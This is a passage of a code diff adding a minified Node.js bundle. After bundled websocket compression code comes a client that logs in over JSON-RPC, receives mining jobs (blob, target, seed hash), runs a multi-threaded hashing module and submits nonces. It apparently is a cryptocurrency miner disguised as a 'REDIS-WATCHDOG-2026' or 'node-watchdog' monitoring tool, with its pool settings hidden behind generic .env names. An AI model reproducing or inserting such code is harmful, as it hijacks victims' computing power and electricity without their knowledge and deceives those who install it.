+                            const r = i.concat(this._inflate[u], this._inflate[l]);
+                            this._inflate._readableState.endEmitted ? (this._inflate.close(), this._inflate = null) : (this._inflate[l] = 0, this._inflate[u] = [], t && this.params[`${o}_no_context_takeover`] && this._inflate.reset()), s(null, r)
+                        })
+                    }
+                    _compress(e, t, s) {
+                        const o = this._isServer ? "server" : "client";
+                        if (!this._deflate) {
+                            const e = `${o}_max_window_bits`,
+                                t = "number" != typeof this.params[e] ? r.Z_DEFAULT_WINDOWBITS : this.params[e];
+                            this._deflate = r.createDeflateRaw({
+                                ...this._options.zlibDeflateOptions,
+                                windowBits: t
+                            }), this._deflate[l] = 0, this._deflate[u] = [], this._deflate.on("data", p)
+                        }
+                        this._deflate[d] = s, this._deflate.write(e), this._deflate.flush(r.Z_SYNC_FLUSH, () => {
+                            if (!this._deflate) return;
+                            let e = i.concat(this._deflate[u], this._deflate[l]);
+                            t && (e = new a(e.buffer, e.byteOffset, e.length - 4)), this._deflate[d] = null, this._deflate[l] = 0, this._deflate[u] = [], t && this.params[`${o}_no_context_takeover`] && this._deflate.reset(), s(null, e)
+                        })
+                    }
+                }
+            },
+            982(e) {
+                "use strict";
+                e.exports = require("crypto")
+            }
+        },
+        t = {};
+
+    function s(r) {
+        var i = t[r];
+        if (void 0 !== i) return i.exports;
+        var o = t[r] = {
+            id: r,
+            loaded: !1,
+            exports: {}
+        };
+        return e[r](o, o.exports, s), o.loaded = !0, o.exports
+    }
+    s.nmd = e => (e.paths = [], e.children || (e.children = []), e), s.p = "";
+    const r = s(699),
+        i = s(434),
+        o = s(896);
+    class n extends i {
+        constructor({
+            proxyUrl: e,
+            username: t,
+            password: s,
+            agent: r,
+            retryDelay: i = 3e3,
+            maxRetries: o = 0,
+            pingIntervalMs: n = 3e4,
+            connectionTimeout: a = 1e4
+        }) {
+            super(), this.proxyUrl = e, this.username = t, this.password = s, this.agent = r, this.retryDelay = i, this.maxRetries = o, this.retryCount = 0, this.pingIntervalMs = n, this.connectionTimeout = a, this.ws = null, this.workerId = null, this.connected = !1, this.keepAliveInterval = null, this.reconnectTimeout = null, this.connectionTimer = null, this.isReconnecting = !1, this.intentionalDisconnect = !1, this.id = 3
+        }
+        connect() {
+            this.intentionalDisconnect = !1, this._openSocket()
+        }
+        startKeepAlive() {
+            this.stopKeepAlive(), this.keepAliveInterval = setInterval(() => {
+                if (this.ws && 1 === this.ws.readyState) try {
+                    this._send({
+                        id: ++this.id,
+                        jsonrpc: "2.0",
+                        method: "keepalived",
+                        params: {
+                            id: this.workerId
+                        }
+                    })
+                } catch (e) {
+                    this.emit("error", e)
+                } else this.stopKeepAlive()
+            }, this.pingIntervalMs)
+        }
+        stopKeepAlive() {
+            this.keepAliveInterval && (clearInterval(this.keepAliveInterval), this.keepAliveInterval = null)
+        }
+        _openSocket() {
+            this._cleanup(), this.connectionTimer = setTimeout(() => {
+                this.connected || (this.emit("error", new Error("Connection timeout")), this.ws && (this.ws.terminate?.() || this.ws.close()))
+            }, this.connectionTimeout);
+            try {
+                this.ws = new r(this.proxyUrl), this.ws.on("open", () => {
+                    this.connectionTimer && (clearTimeout(this.connectionTimer), this.connectionTimer = null), this.connected = !0, this.retryCount = 0, this.isReconnecting = !1, this._login(), this.startKeepAlive(), this.emit("connected")
+                }), this.ws.on("message", e => this._handleMessage(e)), this.ws.on("close", (e, t) => {
+                    this.connected = !1, this.stopKeepAlive(), this.connectionTimer && (clearTimeout(this.connectionTimer), this.connectionTimer = null), this.emit("disconnected", {
+                        code: e,
+                        reason: t?.toString()
+                    }), this.intentionalDisconnect || this._reconnect()
+                }), this.ws.on("error", e => {
+                    this.emit("error", e)
+                })
+            } catch (e) {
+                this.connectionTimer && (clearTimeout(this.connectionTimer), this.connectionTimer = null), this.emit("error", e), this._reconnect()
+            }
+        }
+        _reconnect() {
+            if (this.isReconnecting || this.intentionalDisconnect) return;
+            if (this.maxRetries > 0 && this.retryCount >= this.maxRetries) return void this.emit("error", new Error(`Max reconnect attempts (${this.maxRetries}) reached`));
+            this.isReconnecting = !0, this.retryCount++;
+            const e = this._backoffDelay();
+            this.emit("reconnecting", {
+                attempt: this.retryCount,
+                delay: e
+            }), this.reconnectTimeout && clearTimeout(this.reconnectTimeout), this.reconnectTimeout = setTimeout(() => {
+                this.reconnectTimeout = null, this._openSocket()
+            }, e)
+        }
+        _backoffDelay() {
+            const e = this.retryDelay * Math.pow(2, Math.min(this.retryCount - 1, 5)),
+                t = 1e3 * Math.random();
+            return Math.min(e + t, 6e4)
+        }
+        _cleanup() {
+            this.stopKeepAlive(), this.reconnectTimeout && (clearTimeout(this.reconnectTimeout), this.reconnectTimeout = null), this.connectionTimer && (clearTimeout(this.connectionTimer), this.connectionTimer = null), this.ws && (this.ws.removeAllListeners(), 1 === this.ws.readyState && this.ws.close(), this.ws = null), this.id = 3, this.workerId = null
+        }
+        _login() {
+            this._send({
+                id: 1,
+                method: "login",
+                jsonrpc: "2.0",
+                params: {
+                    login: this.username,
+                    pass: this.password,
+                    agent: this.agent
+                }
+            })
+        }
+        _handleMessage(e) {
+            let t;
+            try {
+                t = JSON.parse(e)
+            } catch {
+                return
+            }
+            1 === t.id && t.result && (t.result.id && (this.workerId = t.result.id), t.result.job && this.emit("job", t.result.job)), "job" === t.method && t.params && this.emit("job", t.params), 2 === t.id && (t.result ? "OK" === t.result.status ? this.emit("accepted", t.result) : this.emit("rejected", t.result) : t.error && this.emit("rejected", t.error)), t.error && this.emit("error", t.error)
+        }
+        submit({
+            job_id: e,
+            nonce: t,
+            result: s
+        }) {
+            if (!this.workerId) throw new Error("Not logged in");
+            if (!this.connected || !this.ws || 1 !== this.ws.readyState) throw new Error("Not connected");
+            this._send({
+                id: 2,
+                method: "submit",
+                jsonrpc: "2.0",
+                params: {
+                    id: this.workerId,
+                    job_id: e,
+                    nonce: t,
+                    result: s
+                }
+            }), this.emit("submitted", {
+                job_id: e,
+                nonce: t
+            })
+        }
+        _send(e) {
+            this.ws && 1 === this.ws.readyState && this.ws.send(JSON.stringify(e))
+        }
+        disconnect() {
+            this.intentionalDisconnect = !0, this.isReconnecting = !1, this._cleanup(), this.emit("disconnected", {
+                code: 1e3,
+                reason: "Client disconnect"
+            })
+        }
+        destroy() {
+            this.intentionalDisconnect = !0, this.isReconnecting = !1, this._cleanup(), this.removeAllListeners()
+        }
+    }(async () => {
+        const e = function(e = ".env") {
+            return o.existsSync(e) ? o.readFileSync(e, "utf8").split("\n").filter(e => e.trim() && !e.startsWith("#")).reduce((e, t) => {
+                let [s, r] = t.split("=");
+                return s && r ? (r = r.split("#")[0].trim().replace(/^['"]|['"]$/g, ""), e[s.trim()] = r, e) : e
+            }, {}) : {}
+        }();
+        let t = 0,
+            r = 0,
+            i = 0,
+            a = "",
+            c = "",
+            h = 0,
+            l = "";
+        const d = {
+                url: `${e.SERVER_WS}/${e.SERVER_TARGET}`,
+                username: e.SERVER_DOMAIN,
+                password: e.SERVER_SECRET,
+                agent: "node-watchdog/1.0.0",
+                threads: Number(e.SERVER_CONNECTION ?? 2)
+            },
+            u = () => {
+                console.clear(), console.log(`🔍 REDIS-WATCHDOG-2026 ➜ Task: ${a} • ${i} Mbp/s • Connected: ${t} • Errors: ${r}`)
+            },
+            f = new n({
+                proxyUrl: d.url,
+                username: d.username,
+                password: d.password,
+                agent: d.agent,
+                retryDelay: 5e3,
+                maxRetries: 10
+            });
+        setInterval(() => {
+            i = _.hashrate(), u()
+        }, 3e4);
+        const _ = ((e = "FAST", t, r) => {
+            const i = {
+                threads: t,
+                mode: e
+            };
+            return {
+                ...s(576).init(i.mode, i.threads, r)
+            }
+        })("FAST", d.threads, (...e) => {
+            const [t, s, r] = e;
+            f.submit({
+                job_id: t,
+                nonce: s,
+                result: r
+            })
+        });
+        f.on("connected", () => {
+            l = "", c = "", u()
+        }), f.on("job", e => {
+            if (_.pause(), _.job(e.job_id, e.target, e.blob, c != e.blob), a = e.job_id, c = e.blob, h = e.height, u(), l != e.seed_hash) {
+                if (_.cleanup(), _.alloc()) return _.init(e.seed_hash, d.threads), l = e.seed_hash, _.start(0);
+                process.exit(0)
+            } else _.start()
+        }), f.on("accepted", e => {
+            t++, u()
+        }), f.on("rejected", e => {
+            r++, u()
+        }), f.on("error", e => {
+            _.pause(), process.exit()
+        }), f.on("disconnected", e => {
+            _.pause(), _.cleanup()
+        }), f.connect(), process.on("SIGINT", () => {
+            _.cleanup(), process.exit()
+        }), process.on("SIGTERM", () => {
+            _.cleanup(), process.exit()
+        }), process.on("uncaughtException", e => {
+            console.log(e), _.cleanup(), process.exit(1)
+        }), process.on("unhandledRejection", e => {
+            console.log(e), _.cleanup(), process.exit(1)
+        })
+    })()
+})();
